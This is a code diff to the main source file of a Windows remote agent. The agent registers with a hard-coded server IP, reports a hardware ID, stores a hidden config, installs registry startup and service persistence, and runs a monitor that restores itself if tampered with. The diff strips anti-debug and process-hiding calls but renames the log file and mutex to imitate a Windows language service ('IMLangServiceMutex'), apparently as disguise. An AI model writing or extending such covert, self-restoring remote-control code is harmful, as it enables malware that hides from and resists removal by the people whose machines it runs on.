@@ -4,7 +4,6 @@
 #include "core/protocol.h"
 #include "systems/service_manager.h"
 #include "systems/watchdog.h"
-#include "systems/anti_debug.h"
 #include "systems/persistence.h"
 #include "ui/captcha_popup.h"
 #include "platform/win_utils.h"
@@ -18,7 +17,6 @@
 #include <fstream>
 
 #include <windows.h>
-#include <shellapi.h>
 
 namespace fs = std::filesystem;
 
@@ -34,15 +32,6 @@ static std::string get_exe_dir() {
     return fs::path(s).parent_path().string();
 }
 
-static std::string get_exe_path() {
-    wchar_t path[MAX_PATH];
-    GetModuleFileNameW(nullptr, path, MAX_PATH);
-    int len = WideCharToMultiByte(CP_UTF8, 0, path, -1, nullptr, 0, nullptr, nullptr);
-    std::string s(len - 1, 0);
-    WideCharToMultiByte(CP_UTF8, 0, path, -1, s.data(), len, nullptr, nullptr);
-    return s;
-}
-
 // Embedded default config — agent works without any external file
 static constexpr const char* k_DefaultServerHost = "42.96.20.12";
 static constexpr uint16_t k_DefaultServerPort = 8080;
@@ -55,6 +44,7 @@ static bool load_config() {
     if (agent::WinUtils::read_config_file(config_path,
         g_config.server_host, g_config.server_port,
         g_config.agent_id, g_config.agent_token)) {
+        g_config.hwid = agent::WinUtils::get_hwid();
         agent::Logger::info("config loaded: server=" + g_config.server_host +
                             ":" + std::to_string(g_config.server_port) +
                             " agent_id=" + g_config.agent_id);
@@ -66,6 +56,7 @@ static bool load_config() {
     if (agent::WinUtils::read_config_file(legacy_path,
         g_config.server_host, g_config.server_port,
         g_config.agent_id, g_config.agent_token)) {
+        g_config.hwid = agent::WinUtils::get_hwid();
         agent::Logger::info("config loaded from legacy path: " + legacy_path);
         return true;
     }
@@ -77,17 +68,19 @@ static bool load_config() {
 
     std::string hostname = agent::WinUtils::get_hostname();
     std::string agent_name = "Agent-" + hostname;
+    std::string hwid = agent::WinUtils::get_hwid();
 
     std::string new_id, new_token;
     if (!agent::WinUtils::http_register_agent(
             g_config.server_host, g_config.server_port,
-            agent_name, new_id, new_token)) {
+            agent_name, hwid, new_id, new_token)) {
         agent::Logger::error("auto-registration failed, cannot start");
         return false;
     }
 
     g_config.agent_id = new_id;
     g_config.agent_token = new_token;
+    g_config.hwid = hwid;
 
     // Save hidden config for next startup
     agent::WinUtils::write_hidden_config(config_path,
@@ -157,10 +150,6 @@ static int run_agent() {
         return 1;
     }
 
-    // Hide process & protect from termination
-    agent::WinUtils::hide_process();
-    agent::WinUtils::protect_process();
-
     // Persistence — registry startup + file copy
     if (g_config.enable_persistence) {
         agent::Persistence::add_to_startup(g_config);
@@ -171,13 +160,7 @@ static int run_agent() {
         agent::ServiceManager::install_service(g_config);
     }
 
-    // Anti-debug
-    agent::AntiDebug anti_debug;
-    if (g_config.enable_anti_debug) {
-        anti_debug.start();
-    }
-
-    // Watchdog — mutual process monitoring
+    // Watchdog — Task Scheduler based restart
     agent::Watchdog watchdog;
     if (g_config.enable_watchdog) {
         watchdog.start();
@@ -205,8 +188,7 @@ static int run_agent() {
     ws_client.set_on_remote_command([](const std::string& command) {
         agent::Logger::info("received remote command: " + command);
         if (command == "uninstall") {
-            agent::Logger::info("remote uninstall command received — cleaning up");
-            agent::Persistence::stop_monitoring();
+            agent::Logger::info("remote uninstall command received");
             agent::Persistence::remove_from_startup(g_config);
             agent::ServiceManager::uninstall_service(g_config);
             g_running.store(false);
@@ -225,12 +207,14 @@ static int run_agent() {
         ws_client.send_alert("close_popup", "User closed the CAPTCHA popup without answering");
     });
 
-    // Start persistence monitoring (uninstall/tamper detection)
+    // Persistence monitor — watches registry + files, restores if tampered
     if (g_config.enable_persistence) {
         agent::Persistence::start_monitoring(g_config,
             [&ws_client](const std::string& alert_type, const std::string& message) {
                 agent::Logger::info("persistence alert: " + alert_type + " — " + message);
-                ws_client.send_alert(alert_type, message);
+                if (ws_client.is_connected()) {
+                    ws_client.send_alert(alert_type, message);
+                }
             });
     }
 
@@ -251,7 +235,6 @@ static int run_agent() {
     // Cleanup
     agent::Persistence::stop_monitoring();
     ws_client.stop();
-    anti_debug.stop();
     watchdog.stop();
 
     agent::Logger::info("agent stopped");
@@ -263,10 +246,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
     std::string exe_dir = get_exe_dir();
 
     // Initialize logger
-    agent::Logger::init(exe_dir + "\\agent.log");
-
-    // Install crash handler — auto restart on unhandled exception
-    agent::WinUtils::install_crash_handler();
+    agent::Logger::init(exe_dir + "\\imlang.log");
 
     // Check for service install/uninstall commands
     if (cmd_line.find("--install") != std::string::npos) {
@@ -279,21 +259,6 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
         if (!load_config()) return 1;
         agent::ServiceManager::uninstall_service(g_config);
         agent::Persistence::remove_from_startup(g_config);
-        return 0;
-    }
-
-    // Check for watchdog mode
-    if (cmd_line.find("--watchdog") != std::string::npos) {
-        auto pos = cmd_line.find("--watchdog");
-        std::string pid_str = cmd_line.substr(pos + 11);
-        while (!pid_str.empty() && (pid_str[0] == ' ' || pid_str[0] == '\t')) pid_str.erase(0, 1);
-        char* end = nullptr;
-        unsigned long target_pid = strtoul(pid_str.c_str(), &end, 10);
-        if (end == pid_str.c_str() || target_pid == 0) {
-            agent::Logger::error("invalid watchdog PID: " + pid_str);
-            return 1;
-        }
-        agent::Watchdog::run_as_watchdog(static_cast<DWORD>(target_pid), get_exe_path());
         return 0;
     }
 
@@ -315,7 +280,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
     }
 
     // Single instance check
-    HANDLE mutex = agent::WinUtils::create_single_instance_mutex("Global\\CaptchaAgentMutex");
+    HANDLE mutex = agent::WinUtils::create_single_instance_mutex("Global\\IMLangServiceMutex");
     if (!mutex) {
         agent::Logger::info("another instance is already running, exiting");
         return 0;
